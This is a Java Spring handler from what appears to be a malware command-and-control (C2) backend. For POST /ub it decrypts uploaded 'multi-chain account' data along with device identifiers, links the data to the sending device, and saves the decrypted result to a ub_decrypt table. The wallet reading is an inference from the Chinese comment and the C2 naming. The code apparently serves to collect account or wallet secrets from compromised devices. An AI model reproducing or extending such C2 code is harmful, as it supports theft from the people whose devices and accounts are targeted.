package com.consume.service.handlers;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

import com.consume.service.C2BusinessStore;
import com.consume.service.C2HandlerContext;
import com.consume.service.AbstractC2Handler;

/**
 * POST /ub：多链账户 ba（XADD.md §5.7）。
 *
 * 解密 → save_ub_decrypt（含解密结果与设备字段）→ 关联 c2_records.device_id。
 */
@Component
public class HandleUb extends AbstractC2Handler {

    @Autowired
    private C2BusinessStore store;

    @Override
    public String path() {
        return "/ub";
    }

    @Override
    @Transactional(propagation = Propagation.REQUIRES_NEW, rollbackFor = Exception.class)
    public void handle(C2HandlerContext ctx) throws Exception {
        if (!"POST".equalsIgnoreCase(ctx.getMethod())) {
            log.info("正常日志:[c2_handlers] /ub 非 POST，跳过, id={}", ctx.getRecordId());
            return;
        }
        resolveDomain(ctx);
        // 必须先解密：d/f/u 在明文里，不解密则 DeviceResolver 必然跳过 → ub_decrypt 无 device_row_id
        String plain = decrypt(ctx, "ba", "d", "f", "u", "d3");

        // 先解析设备（ub_decrypt 需要 device_row_id）
        String d = ctx.plaintextStr("d");
        String f = ctx.plaintextStr("f");
        String u = ctx.plaintextStr("u");
        deviceResolver.resolveAndLink(ctx, d, f, u, null, null);

        // 落库 ub_decrypt（无论解密成功失败都记录；无 device 时 store 内部会跳过）
        store.saveUbDecrypt(ctx, ctx.getPlaintext());
        if (plain == null || plain.isEmpty()) {
            log.info("异常日志:[c2_handlers] /ub 解密失败或无明文, id={}", ctx.getRecordId());
        }

        log.info("正常日志:[c2_handlers] call handle_ub 完成, id={}, path={}, decryptOk={}",
                ctx.getRecordId(), ctx.getPath(), ctx.isDecryptOk());
    }
}
